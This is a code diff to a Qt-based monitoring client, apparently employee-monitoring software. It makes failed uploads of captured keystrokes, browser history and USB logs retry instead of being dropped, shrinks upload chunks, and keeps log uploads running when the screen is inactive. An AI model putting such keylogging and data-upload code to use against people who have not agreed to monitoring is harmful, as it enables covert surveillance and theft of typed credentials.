@@ -953,7 +953,7 @@ int MonitorClient::sendBrowserHistories()
                 updateStatusDisplay();
                 return;
             }
-            QList<QList<QJsonObject>> chunks = chunkData(snapshot, 1000);
+            QList<QList<QJsonObject>> chunks = chunkData(snapshot, 500);
             qDebug() << "Sending" << chunks.size() << "browser history chunk(s)";
             setTrayActivity(QStringLiteral("Uploading browser history…"));
             continueSendBrowserChunks(0, chunks);
@@ -1007,8 +1007,9 @@ void MonitorClient::getStorageDevices()
 void MonitorClient::monitorTimerTick()
 {
     if(authToken.isEmpty()||monitorId<1)return;
-    if (isInterruptionRequested() || checkActiveScreen() <= 0)
-        return;
+    if (isInterruptionRequested()) return;
+    // Screen availability gates screenshots only, never heartbeat/log uploads.
+    const bool screenAvailable = checkActiveScreen() > 0;
 
     const qint64 currentTime = QDateTime::currentSecsSinceEpoch();
 
@@ -1028,7 +1029,7 @@ void MonitorClient::monitorTimerTick()
         m_lastEmitTicTime = currentTime;
     }
 
-    if (currentTime - m_lastEmitScreenshotTime >= screenInterval && screenshotEnabled) {
+    if (currentTime - m_lastEmitScreenshotTime >= screenInterval && screenshotEnabled && screenAvailable) {
         emit screen();
         m_lastEmitScreenshotTime = currentTime;
     }
@@ -1126,7 +1127,7 @@ int MonitorClient::sendUSBLogs()
     if (serverIP.isEmpty() || serverPort <= 0)
         return -3;
 
-    QList<QList<QJsonObject>> chunks = chunkData(usbLogs, 1000);
+    QList<QList<QJsonObject>> chunks = chunkData(usbLogs, 500);
     usbLogs.clear();
     qDebug() << "Sending" << chunks.size() << "USB log chunk(s)";
     continueSendUsbLogs(0, chunks);
@@ -1219,9 +1220,16 @@ void MonitorClient::continueSendKeyLogs(int index, QList<QList<QJsonObject>> chu
                     continueSendKeyLogs(index + 1, chunks);
                 });
             } else {
+                // Requeue the failed and later batches for the next scheduled
+                // attempt. Keep newly captured events after the older backlog.
+                QList<QJsonObject> pending;
+                for(int batch=index;batch<chunks.size();++batch)
+                    pending.append(chunks[batch]);
+                pending.append(keyLogs);
+                keyLogs.swap(pending);
                 qWarning() << "[KeyLog] chunk" << (index + 1) << "/" << chunks.size()
                            << "HTTP failed (non-200 or network error)," << chunks[index].size()
-                           << "events lost from this batch";
+                           << "events retained for retry";
                 updateStatusDisplay();
             }
         });
@@ -1245,6 +1253,13 @@ void MonitorClient::continueSendUsbLogs(int index, QList<QList<QJsonObject>> chu
                     continueSendUsbLogs(index + 1, chunks);
                 });
             } else {
+                // Requeue the failed and later batches for the next scheduled
+                // attempt. Keep newly captured events after the older backlog.
+                QList<QJsonObject> pending;
+                for(int batch=index;batch<chunks.size();++batch)
+                    pending.append(chunks[batch]);
+                pending.append(usbLogs);
+                usbLogs.swap(pending);
                 qDebug() << "USB log chunk failed at" << index;
                 updateStatusDisplay();
             }
@@ -1275,6 +1290,13 @@ void MonitorClient::continueSendBrowserChunks(int index, QList<QList<QJsonObject
                     continueSendBrowserChunks(index + 1, chunks);
                 });
             } else {
+                // Requeue the failed and later batches for the next scheduled
+                // attempt. Keep newly captured events after the older backlog.
+                QList<QJsonObject> pending;
+                for(int batch=index;batch<chunks.size();++batch)
+                    pending.append(chunks[batch]);
+                pending.append(browserHistories);
+                browserHistories.swap(pending);
                 qDebug() << "Browser history chunk failed at" << index;
                 clearTrayActivity();
                 m_browserHistoryBusy = false;
